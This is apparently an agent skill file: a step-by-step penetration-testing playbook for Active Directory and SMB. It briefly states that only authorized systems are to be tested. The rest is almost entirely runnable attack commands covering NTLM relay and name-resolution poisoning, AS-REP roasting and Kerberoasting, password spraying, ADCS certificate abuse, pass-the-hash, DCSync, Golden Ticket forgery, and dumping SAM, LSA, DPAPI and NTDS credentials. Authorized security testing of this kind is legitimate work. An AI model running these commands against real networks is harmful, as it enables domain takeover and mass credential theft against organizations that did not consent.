---
name: playbook-ad
description: "Active Directory/SMB pentest: Kerberos, LDAP, GPO, ADCS, delegation, lateral movement, null sessions, share enum, NTLM relay. Triggers - domain controller, Kerberos, BloodHound, kerberoast, SMB, relay."
---

## Rules of Engagement
Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.

# Active Directory & SMB Attack Path

## Prerequisites
- Domain name, DC IPs
- Initial foothold or network access to AD environment
- Credentials (if provided for gray box)

## Phase Flow

### 1. AD Enumeration (No Creds)
```bash
# Identify Domain Controllers
nmap -sV -p 88,389,636,445,3268,3269 <subnet>

# DNS enumeration
dig SRV _ldap._tcp.dc._msdcs.<domain>
dig SRV _kerberos._tcp.<domain>

# Null session enumeration
enum4linux-ng -A <dc_ip>
rpcclient -U '' -N <dc_ip> -c 'enumdomusers'
rpcclient -U '' -N <dc_ip> -c 'enumdomgroups'
ldapsearch -x -H ldap://<dc_ip> -b "" -s base namingContexts

# SMB shares: null and guest session
smbclient -N -L //<dc_ip>
netexec smb <dc_ip> --shares
netexec smb <dc_ip> -u '' -p '' --shares
netexec smb <dc_ip> -u 'guest' -p '' --shares
netexec smb <dc_ip> --users
```

### 2. SMB Signing & Relay
```bash
# Check signing: "signing:False" on hosts is the relay target list
netexec smb <subnet> --gen-relay-list relay_targets.txt
nmap --script smb-security-mode -p 445 <target>

# Relay captured auth to unsigned hosts
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Trigger auth with Responder or mitm6
responder -I <iface> -rdwv
mitm6 -d <domain>
# OPSEC: Responder and mitm6 are loud and poison name resolution.
# Run only on an authorized, isolated segment; never alongside legitimate
# DNS/LLMNR traffic on production. Prefer targeted coercion over broadcast.
```

### 3. User Enumeration & Credential Attacks
```bash
# Kerbrute user enumeration
kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting (no creds needed)
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip>
# Crack with hashcat -m 18200

# Password spraying: one attempt per user, current-year policy-compliant candidate from the engagement's wordlist
netexec smb <dc_ip> -u users.txt -p '<candidate>' --no-bruteforce
kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt '<candidate>'
```

### 4. Authenticated Enumeration
```bash
# BloodHound collection
bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <dc_ip> -c all
# Import into BloodHound GUI -> find shortest path to DA

# LDAP enumeration
ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<pass>' -b '<base_dn>' '(objectClass=user)' sAMAccountName memberOf

# Group Policy
netexec smb <dc_ip> -u <user> -p '<pass>' --gpp-passwords

# Kerberoasting (requires any valid user)
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request
# Crack with hashcat -m 13100

# Share spidering for credentials and configs
netexec smb <target> -u <user> -p '<pass>' --spider <share> --pattern "passw|secret|cred|key|config"
smbclient //<target>/<share> -U <user>%<pass>
smbget -R smb://<target>/<share> -U <user>%<pass>
```

### 5. ADCS / ESC Abuse
```bash
# Enumerate certificate templates and CAs
certipy-ad find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout

# ESC1: enrollee-supplied SAN with client-auth template -> request as admin
certipy-ad req -u <user>@<domain> -p '<pass>' -ca <ca> -template <template> -upn administrator@<domain>
# ESC8: relay coerced machine auth to the CA's HTTP enrollment endpoint
impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp --adcs --template DomainController

# Authenticate with the issued certificate (PKINIT -> TGT)
certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 6. Privilege Escalation & Lateral Movement
```bash
# Pass-the-Hash
netexec smb <targets> -u <user> -H <ntlm_hash>
impacket-psexec -hashes :<ntlm_hash> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# Unconstrained delegation abuse
impacket-findDelegation <domain>/<user>:'<pass>' -dc-ip <dc_ip>

# ACL abuse (GenericAll, WriteDACL, etc.)
# Use BloodHound to identify -> exploit with PowerView or impacket
```

### 7. Domain Dominance & Credential Dumping
```bash
# DCSync (requires Replicating Directory Changes)
impacket-secretsdump <domain>/<user>:'<pass>'@<dc_ip>

# Golden Ticket (requires krbtgt hash)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<dc_ip>

# Post-auth local secrets (run once per host, in order)
netexec smb <target> -u <user> -p '<pass>' --sam     # local SAM hashes
netexec smb <target> -u <user> -p '<pass>' --lsa     # LSA secrets, cached domain creds
netexec smb <target> -u <user> -p '<pass>' --dpapi   # DPAPI: browser passwords, vault, cookies, Credential Manager
# Bare --dpapi returns everything; do not add subcommands, they narrow the output.
netexec smb <dc_ip> -u <user> -p '<pass>' --ntds     # all domain hashes from a DC
# Fallback one-shot:
impacket-secretsdump <domain>/<user>:'<pass>'@<target>
```

## Key AD Attack Paths
1. AS-REP Roast -> crack hash -> authenticated enum -> Kerberoast -> crack -> DA
2. Password spray -> creds -> BloodHound -> ACL abuse path -> DA
3. Null session -> user list -> spray -> delegation abuse -> DA
4. NTLM relay -> local admin -> credential dump -> lateral movement -> DA
5. ADCS ESC -> certificate -> PKINIT TGT -> DA
